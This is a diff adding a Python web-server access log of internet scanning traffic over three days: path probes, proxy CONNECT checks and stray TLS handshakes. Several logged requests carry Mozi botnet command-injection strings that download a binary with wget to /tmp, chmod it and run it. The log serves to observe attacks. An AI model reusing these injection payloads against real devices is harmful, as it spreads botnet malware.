@@ -1,1 +1,169 @@
 104.28.200.202 - - [04/Nov/2025 11:47:49] "GET / HTTP/1.1" 200 -
+45.135.193.2 - - [04/Nov/2025 14:23:59] code 404, message File not found
+45.135.193.2 - - [04/Nov/2025 14:23:59] "GET /login HTTP/1.1" 404 -
+176.109.14.91 - - [04/Nov/2025 14:56:39] "GET / HTTP/1.1" 200 -
+79.124.40.174 - - [04/Nov/2025 17:14:20] code 404, message File not found
+79.124.40.174 - - [04/Nov/2025 17:14:20] "GET /jars HTTP/1.1" 404 -
+149.86.227.40 - - [04/Nov/2025 18:11:09] code 404, message File not found
+149.86.227.40 - - [04/Nov/2025 18:11:09] "GET /config HTTP/1.1" 404 -
+94.74.182.74 - - [04/Nov/2025 18:31:29] "GET / HTTP/1.1" 200 -
+45.135.193.2 - - [04/Nov/2025 19:07:23] code 404, message File not found
+45.135.193.2 - - [04/Nov/2025 19:07:23] "GET /login HTTP/1.1" 404 -
+94.74.182.74 - - [04/Nov/2025 19:25:15] "GET / HTTP/1.1" 200 -
+198.235.24.53 - - [04/Nov/2025 21:30:56] "GET / HTTP/1.1" 200 -
+167.99.205.249 - - [04/Nov/2025 22:29:22] "GET / HTTP/1.1" 200 -
+167.99.205.249 - - [04/Nov/2025 22:29:22] code 404, message File not found
+167.99.205.249 - - [04/Nov/2025 22:29:22] "GET /favicon.ico HTTP/1.1" 404 -
+3.83.145.39 - - [04/Nov/2025 23:14:28] code 400, message Bad request version ('À\\x14À')
+3.83.145.39 - - [04/Nov/2025 23:14:28] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ùí\x14\x1eÀí\x8f\x19àõ\x83\x0d\x1a\x82Õw.{£\x90ó+>¡gõ\x1dê\x07Ú\x829  ve2jmiÏvrÙÇL\x91û\x87T\x1fU\x7fîõ\x1bÑùO|¥\x11Ë§4\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+45.135.193.2 - - [04/Nov/2025 23:34:31] code 404, message File not found
+45.135.193.2 - - [04/Nov/2025 23:34:31] "GET /login HTTP/1.1" 404 -
+147.185.132.19 - - [04/Nov/2025 23:48:40] "GET / HTTP/1.0" 200 -
+176.65.149.45 - - [04/Nov/2025 23:57:09] "GET / HTTP/1.1" 200 -
+219.156.27.169 - - [05/Nov/2025 00:52:43] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+219.156.27.169 - - [05/Nov/2025 00:52:43] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 -
+115.231.78.11 - - [05/Nov/2025 00:55:26] "GET / HTTP/1.1" 200 -
+115.231.78.11 - - [05/Nov/2025 00:55:27] "GET / HTTP/1.1" 200 -
+115.231.78.11 - - [05/Nov/2025 00:55:28] code 404, message File not found
+115.231.78.11 - - [05/Nov/2025 00:55:28] "GET /favicon.ico HTTP/1.1" 404 -
+115.231.78.11 - - [05/Nov/2025 00:55:28] code 404, message File not found
+115.231.78.11 - - [05/Nov/2025 00:55:28] "GET /robots.txt HTTP/1.1" 404 -
+205.210.31.227 - - [05/Nov/2025 01:01:00] code 400, message Bad request version ('À\\x13À')
+205.210.31.227 - - [05/Nov/2025 01:01:00] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x91\x81`µ¿vc·Ã\x93©ÏIûÊ\x82Z¡W|Ïà£³K\x01\x91B\x98\x1dpÛ ¿¼ÿU\x9bI¥´5¯,\x98Ì\x06f\x16*Kc\x12L½G\x1f dq\x1c\x024\x19\x95\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" 400 -
+205.210.31.227 - - [05/Nov/2025 01:01:00] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x01\\x00Ê\\x01\\x00\\x00Æ\\x03\\x03X\\x8c\\x95ÈáèP\\x15\\x7fL-\\x9dÖõô"T]\\x1a"â\\x9a:âë±þ«2îç\\x10\\x00\\x00hÌ\\x14Ì\\x13À/À+À0À,À\\x11À\\x07À\\'À#À\\x13À')
+205.210.31.227 - - [05/Nov/2025 01:01:00] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03X\x8c\x95ÈáèP\x15\x7fL-\x9dÖõô"T]\x1a"â\x9a:âë±þ«2îç\x10\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" 400 -
+45.135.193.2 - - [05/Nov/2025 04:08:36] code 404, message File not found
+45.135.193.2 - - [05/Nov/2025 04:08:36] "GET /login HTTP/1.1" 404 -
+94.74.182.74 - - [05/Nov/2025 04:56:52] "GET / HTTP/1.1" 200 -
+94.74.182.74 - - [05/Nov/2025 06:50:29] "GET / HTTP/1.1" 200 -
+64.62.156.24 - - [05/Nov/2025 07:00:14] code 400, message Bad request version ('À\\x14À')
+64.62.156.24 - - [05/Nov/2025 07:00:14] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1dº¦\x96\x1a?ZSe{]\x13m\x87y¾Ê°­Pë\x0fñ\x9a\x8d¬d\x1c'Z\x9bs\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" 400 -
+176.109.14.91 - - [05/Nov/2025 07:02:59] "GET / HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('45.79.207.181', 60035)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 318, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/usr/lib/python3.12/socketserver.py", line 349, in process_request
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+45.79.207.181 - - [05/Nov/2025 07:32:00] "GET / HTTP/1.1" 200 -
+172.236.228.227 - - [05/Nov/2025 07:32:05] "GET / HTTP/1.1" 200 -
+45.135.193.2 - - [05/Nov/2025 08:18:44] code 404, message File not found
+45.135.193.2 - - [05/Nov/2025 08:18:44] "GET /login HTTP/1.1" 404 -
+196.251.66.12 - - [05/Nov/2025 08:33:26] code 501, message Unsupported method ('CONNECT')
+196.251.66.12 - - [05/Nov/2025 08:33:26] "CONNECT 185.65.245.10:7227 HTTP/1.1" 501 -
+65.49.1.122 - - [05/Nov/2025 10:01:11] "GET / HTTP/1.1" 200 -
+65.49.1.131 - - [05/Nov/2025 10:01:30] code 404, message File not found
+65.49.1.131 - - [05/Nov/2025 10:01:30] "GET /favicon.ico HTTP/1.1" 404 -
+65.49.1.123 - - [05/Nov/2025 10:01:38] code 404, message File not found
+65.49.1.123 - - [05/Nov/2025 10:01:38] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+65.49.1.125 - - [05/Nov/2025 10:01:41] code 501, message Unsupported method ('CONNECT')
+65.49.1.125 - - [05/Nov/2025 10:01:41] "CONNECT www.shadowserver.org:443 HTTP/1.1" 501 -
+176.65.149.45 - - [05/Nov/2025 10:36:05] "GET / HTTP/1.1" 200 -
+79.124.40.174 - - [05/Nov/2025 10:56:56] code 404, message File not found
+79.124.40.174 - - [05/Nov/2025 10:56:56] "GET /jars HTTP/1.1" 404 -
+124.95.42.145 - - [05/Nov/2025 11:25:12] code 400, message Bad HTTP/0.9 request type ("27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a")
+124.95.42.145 - - [05/Nov/2025 11:25:12] "27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a HTTP/1.0" 400 -
+176.65.149.45 - - [05/Nov/2025 11:45:09] "GET / HTTP/1.1" 200 -
+89.110.97.157 - - [05/Nov/2025 12:22:21] "GET / HTTP/1.1" 200 -
+138.68.92.186 - - [05/Nov/2025 12:53:42] code 404, message File not found
+138.68.92.186 - - [05/Nov/2025 12:53:42] "GET /squid-internal-mgr/cachemgr.cgi HTTP/1.1" 404 -
+146.190.241.68 - - [05/Nov/2025 12:57:08] code 404, message File not found
+146.190.241.68 - - [05/Nov/2025 12:57:08] "GET /squid-internal-mgr/cachemgr.cgi HTTP/1.1" 404 -
+45.135.193.2 - - [05/Nov/2025 13:07:07] code 404, message File not found
+45.135.193.2 - - [05/Nov/2025 13:07:07] "GET /login HTTP/1.1" 404 -
+94.74.182.74 - - [05/Nov/2025 16:19:12] "GET / HTTP/1.1" 200 -
+172.178.83.182 - - [05/Nov/2025 16:47:31] code 400, message Bad request syntax ('MGLNDD_212.193.26.156_8081')
+172.178.83.182 - - [05/Nov/2025 16:47:31] "MGLNDD_212.193.26.156_8081" 400 -
+45.135.193.2 - - [05/Nov/2025 17:25:34] code 404, message File not found
+45.135.193.2 - - [05/Nov/2025 17:25:34] "GET /login HTTP/1.1" 404 -
+20.84.144.171 - - [05/Nov/2025 17:27:41] "GET / HTTP/1.1" 200 -
+20.84.144.171 - - [05/Nov/2025 17:27:41] code 400, message Bad request syntax ('MGLNDD_212.193.26.156_8081')
+20.84.144.171 - - [05/Nov/2025 17:27:41] "MGLNDD_212.193.26.156_8081" 400 -
+94.74.182.74 - - [05/Nov/2025 17:33:10] "GET / HTTP/1.1" 200 -
+45.151.139.140 - - [05/Nov/2025 17:45:33] "GET / HTTP/1.1" 200 -
+20.15.164.165 - - [05/Nov/2025 17:49:02] "GET / HTTP/1.1" 200 -
+20.15.164.165 - - [05/Nov/2025 17:49:02] code 400, message Bad request syntax ('MGLNDD_212.193.26.156_8081')
+20.15.164.165 - - [05/Nov/2025 17:49:02] "MGLNDD_212.193.26.156_8081" 400 -
+79.124.40.174 - - [05/Nov/2025 18:37:55] code 404, message File not found
+79.124.40.174 - - [05/Nov/2025 18:37:55] "GET /jars HTTP/1.1" 404 -
+94.74.182.74 - - [05/Nov/2025 19:42:28] "GET / HTTP/1.1" 200 -
+45.135.193.2 - - [05/Nov/2025 22:02:58] code 404, message File not found
+45.135.193.2 - - [05/Nov/2025 22:02:58] "GET /login HTTP/1.1" 404 -
+95.215.0.144 - - [05/Nov/2025 22:40:31] "GET / HTTP/1.0" 200 -
+176.32.195.85 - - [05/Nov/2025 22:41:12] code 400, message Bad request version ('À\\x13À')
+176.32.195.85 - - [05/Nov/2025 22:41:12] "\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03DW\x1dZ@-q¯æ±êËÓTë\x07ÄÃ\x9bLaÝXïShK_ÿVHÙ :\x1cÒèÆpÕ~õ¾ÀaÒP\x81\x14\x08\x84SB\x8a¿þ|å\x9fi\x0eê\x10Aè\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À" 400 -
+176.32.195.85 - - [05/Nov/2025 22:41:12] code 404, message File not found
+176.32.195.85 - - [05/Nov/2025 22:41:12] "GET /aaa9 HTTP/1.1" 404 -
+176.32.195.85 - - [05/Nov/2025 22:41:12] code 400, message Bad request version ('À\\x13À')
+176.32.195.85 - - [05/Nov/2025 22:41:12] "\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03kßf>¾óA"\x14\x9dÓ¤Ú³0û¶nÌ¹HÖ¬8\x8dª¬ìJG\x8d\x90 \x9a3\x7f{û\x15Á×¯5·\x09\x0eÚ\x09k\x0dÜ\x8dmHv\x9fpf­\x9d³ _Âß\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À" 400 -
+176.32.195.85 - - [05/Nov/2025 22:41:12] code 404, message File not found
+176.32.195.85 - - [05/Nov/2025 22:41:12] "GET /aab9 HTTP/1.1" 404 -
+185.91.127.97 - - [05/Nov/2025 23:48:07] code 501, message Unsupported method ('CONNECT')
+185.91.127.97 - - [05/Nov/2025 23:48:07] "CONNECT api.my-ip.io:443 HTTP/1.1" 501 -
+20.98.165.171 - - [06/Nov/2025 01:16:22] "GET / HTTP/1.1" 200 -
+20.98.165.171 - - [06/Nov/2025 01:16:22] code 400, message Bad request syntax ('MGLNDD_212.193.26.156_8081')
+20.98.165.171 - - [06/Nov/2025 01:16:22] "MGLNDD_212.193.26.156_8081" 400 -
+185.91.127.97 - - [06/Nov/2025 01:22:04] code 501, message Unsupported method ('CONNECT')
+185.91.127.97 - - [06/Nov/2025 01:22:04] "CONNECT ipinfo.io:443 HTTP/1.1" 501 -
+198.235.24.90 - - [06/Nov/2025 01:48:21] "GET / HTTP/1.0" 200 -
+143.244.191.193 - - [06/Nov/2025 02:57:07] "GET / HTTP/1.1" 200 -
+143.244.191.193 - - [06/Nov/2025 02:57:07] code 404, message File not found
+143.244.191.193 - - [06/Nov/2025 02:57:07] "GET /favicon.ico HTTP/1.1" 404 -
+205.210.31.53 - - [06/Nov/2025 02:58:58] code 400, message Bad request version ('BE{ÒÊ\\x98')
+205.210.31.53 - - [06/Nov/2025 02:58:58] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x037\x95Ç±7§^2Ó\x06\x89\x1bËÏCO2\x06q­\x89@\x0c³\x09BE{ÒÊ\x98" 400 -
+205.210.31.53 - - [06/Nov/2025 02:58:58] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x01\\x00Ê\\x01\\x00\\x00Æ\\x03\\x03j\\x98Êè"\\x02\\x9bÆ\\x18ö~aÖLìÈ"¬\\x16Üóû\\x82ôFp/\\x9d\\x8c5\\x93²\\x00\\x00hÌ\\x14Ì\\x13À/À+À0À,À\\x11À\\x07À\\'À#À\\x13À')
+205.210.31.53 - - [06/Nov/2025 02:58:58] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03j\x98Êè"\x02\x9bÆ\x18ö~aÖLìÈ"¬\x16Üóû\x82ôFp/\x9d\x8c5\x93²\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" 400 -
+90.151.171.108 - - [06/Nov/2025 03:10:42] code 501, message Unsupported method ('CONNECT')
+90.151.171.108 - - [06/Nov/2025 03:10:42] "CONNECT ip.bablosoft.com:443 HTTP/1.1" 501 -
+90.151.171.108 - - [06/Nov/2025 03:10:47] code 400, message Bad request syntax ('\\x04\\x01\\x00P\\x8e]\\x86\\x800\\x00')
+90.151.171.108 - - [06/Nov/2025 03:10:47] "\x04\x01\x00P\x8e]\x86\x800\x00" 400 -
+90.151.171.108 - - [06/Nov/2025 03:10:47] code 404, message File not found
+90.151.171.108 - - [06/Nov/2025 03:10:47] "GET http://ip.bablosoft.com/?Z72505249653Q1 HTTP/1.1" 404 -
+90.151.171.108 - - [06/Nov/2025 03:10:52] code 400, message Bad request syntax ('\\x05\\x01\\x00')
+90.151.171.108 - - [06/Nov/2025 03:10:52] "\x05\x01\x00" 400 -
+94.74.182.74 - - [06/Nov/2025 03:15:25] "GET / HTTP/1.1" 200 -
+198.235.24.228 - - [06/Nov/2025 03:40:42] "GET / HTTP/1.1" 200 -
+65.49.1.222 - - [06/Nov/2025 03:52:19] "GET / HTTP/1.1" 200 -
+65.49.1.223 - - [06/Nov/2025 03:52:31] code 404, message File not found
+65.49.1.223 - - [06/Nov/2025 03:52:31] "GET /favicon.ico HTTP/1.1" 404 -
+65.49.1.222 - - [06/Nov/2025 03:52:36] code 404, message File not found
+65.49.1.222 - - [06/Nov/2025 03:52:36] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+65.49.1.225 - - [06/Nov/2025 03:52:39] code 501, message Unsupported method ('CONNECT')
+65.49.1.225 - - [06/Nov/2025 03:52:39] "CONNECT www.shadowserver.org:443 HTTP/1.1" 501 -
+109.237.26.206 - - [06/Nov/2025 03:57:34] "GET / HTTP/1.0" 200 -
+109.237.26.206 - - [06/Nov/2025 03:57:45] code 400, message Bad request version ("5\\x00\\x9c\\x13\\x02\\x13\\x03\\x13\\x01\\x003\\x009\\x005\\x00/À,À0\\x00£\\x00\\x9fÌ©Ì¨ÌªÀ¯À\\xadÀ£À\\x9fÀ]ÀaÀWÀSÀ+À/\\x00¢\\x00\\x9eÀ®À¬À¢À\\x9eÀ\\\\À`ÀVÀRÀ$À(\\x00k\\x00jÀsÀw\\x00Ä\\x00ÃÀ#À'\\x00g\\x00@ÀrÀv\\x00¾\\x00½À")
+109.237.26.206 - - [06/Nov/2025 03:57:45] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03Ê44ü·3¡\x84µ6\x09Ï\x0dPv\\¾\x99"Ô\x03üº3\x92Ü\x7f\x07¯÷2\x07 ÒiÄ»4û¦\x1fâ$è¤£©\x82)ÿ\x88¬Ä\x8aè®júï\x91¬ìq\x1e5\x00\x9c\x13\x02\x13\x03\x13\x01\x003\x009\x005\x00/À,À0\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À­À£À\x9fÀ]ÀaÀWÀSÀ+À/\x00¢\x00\x9eÀ®À¬À¢À\x9eÀ\\À`ÀVÀRÀ$À(\x00k\x00jÀsÀw\x00Ä\x00ÃÀ#À'\x00g\x00@ÀrÀv\x00¾\x00½À" 400 -
+109.237.26.206 - - [06/Nov/2025 03:57:45] "GET / HTTP/1.0" 200 -
+109.237.26.206 - - [06/Nov/2025 03:57:45] "GET / HTTP/1.1" 200 -
+209.38.136.74 - - [06/Nov/2025 04:35:38] code 404, message File not found
+209.38.136.74 - - [06/Nov/2025 04:35:38] "GET /squid-internal-mgr/cachemgr.cgi HTTP/1.1" 404 -
+124.29.214.72 - - [06/Nov/2025 06:03:19] code 400, message Bad HTTP/0.9 request type ("27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a")
+124.29.214.72 - - [06/Nov/2025 06:03:19] "27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a HTTP/1.0" 400 -
+45.156.128.39 - - [06/Nov/2025 06:18:07] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x01\\x00\\x9d\\x01\\x00\\x00\\x99\\x03\\x03\\x95?=¶\\x00tüpàÈm\\x9f¬?ÆÎLà`=\\x05Jð\\x05;Iáhås\\x86h\\x00\\x00BÀ\\x11À\\x07À\\x13À')
+45.156.128.39 - - [06/Nov/2025 06:18:07] "\x16\x03\x01\x00\x9d\x01\x00\x00\x99\x03\x03\x95?=¶\x00tüpàÈm\x9f¬?ÆÎLà`=\x05Jð\x05;Iáhås\x86h\x00\x00BÀ\x11À\x07À\x13À\x09À\x14À" 400 -
+64.62.156.142 - - [06/Nov/2025 06:55:06] code 400, message Bad HTTP/0.9 request type ("\\x16\\x03\\x01\\x00{\\x01\\x00\\x00w\\x03\\x03ù0ÒÈ7\\x8a0\\x8a8'>{@=¨©n\\\\¯üÓ+ÚA*ËÓN)Ô¹^\\x00\\x00\\x1aÀ/À+À\\x11À\\x07À\\x13À")
+64.62.156.142 - - [06/Nov/2025 06:55:06] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ù0ÒÈ7\x8a0\x8a8'>{@=¨©n\\¯üÓ+ÚA*ËÓN)Ô¹^\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" 400 -
+64.227.146.163 - - [06/Nov/2025 07:40:36] code 404, message File not found
+64.227.146.163 - - [06/Nov/2025 07:40:36] "GET /aaa9 HTTP/1.1" 404 -
+64.227.146.163 - - [06/Nov/2025 07:40:36] code 404, message File not found
+64.227.146.163 - - [06/Nov/2025 07:40:36] "GET /aab8 HTTP/1.1" 404 -
+64.227.146.163 - - [06/Nov/2025 07:40:37] "GET / HTTP/1.1" 200 -
+167.71.102.95 - - [06/Nov/2025 09:32:59] code 404, message File not found
+167.71.102.95 - - [06/Nov/2025 09:32:59] "GET /squid-internal-mgr/cachemgr.cgi HTTP/1.1" 404 -
